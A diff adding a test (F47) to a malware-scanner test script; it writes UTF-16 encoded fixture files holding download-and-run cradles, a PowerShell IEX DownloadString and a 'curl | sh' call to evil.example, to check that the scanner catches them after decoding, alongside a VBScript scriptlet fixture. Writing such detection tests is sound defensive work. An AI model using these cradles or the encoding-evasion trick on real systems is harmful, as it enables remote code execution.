@@ -8029,6 +8029,29 @@ printf '<?xml version="1.0"?>\n<jnlp codebase="."><resources><jar href="local.ja
 ./hlse_core file "$XDIR/ok.jnlp" 2>&1 | grep -q "JNLP" \
     && check "file: local jnlp no F45" "0" "1" \
     || check "file: local jnlp no F45" "0" "0"
+# F47: UTF-16 encoding evasion — BOM files decoded before string checks
+python3 - "$XDIR" <<'EOF'
+import sys, os
+d = sys.argv[1]
+open(os.path.join(d, 'u16.ps1'), 'wb').write(b'\xff\xfe' +
+    'IEX (New-Object Net.WebClient).DownloadString("http://evil.example/p.ps1")'.encode('utf-16-le'))
+open(os.path.join(d, 'u16be.txt'), 'wb').write(b'\xfe\xff' +
+    'curl http://evil.example|sh'.encode('utf-16-be'))
+open(os.path.join(d, 'plain16.txt'), 'wb').write(b'\xff\xfe' +
+    'just a normal unicode note'.encode('utf-16-le'))
+EOF
+./hlse_core file "$XDIR/u16.ps1" 2>&1 | grep -q "SCRIPT CRADLE" \
+    && check "file: UTF-16LE cradle detected after decode" "0" "0" \
+    || check "file: UTF-16LE cradle detected after decode" "0" "1"
+./hlse_core file "$XDIR/u16be.txt" 2>&1 | grep -q "SCRIPT CRADLE" \
+    && check "file: UTF-16BE cradle detected after decode" "0" "0" \
+    || check "file: UTF-16BE cradle detected after decode" "0" "1"
+./hlse_core file "$XDIR/u16.ps1" 2>&1 | grep -q "UTF-16" \
+    && check "file: UTF-16 decode marker emitted" "0" "0" \
+    || check "file: UTF-16 decode marker emitted" "0" "1"
+./hlse_core file "$XDIR/plain16.txt" 2>&1 | grep -q "SCRIPT CRADLE" \
+    && check "file: benign UTF-16 text no F14" "0" "1" \
+    || check "file: benign UTF-16 text no F14" "0" "0"
 printf '<scriptlet><registration progid="x"><script language="VBScript">CreateObject("WScript.Shell").Run "calc"</script></registration></scriptlet>\n' \
     > "$XDIR/x.sct"
 ./hlse_core file "$XDIR/x.sct" 2>&1 | grep -q "SCT SCRIPTLET" \
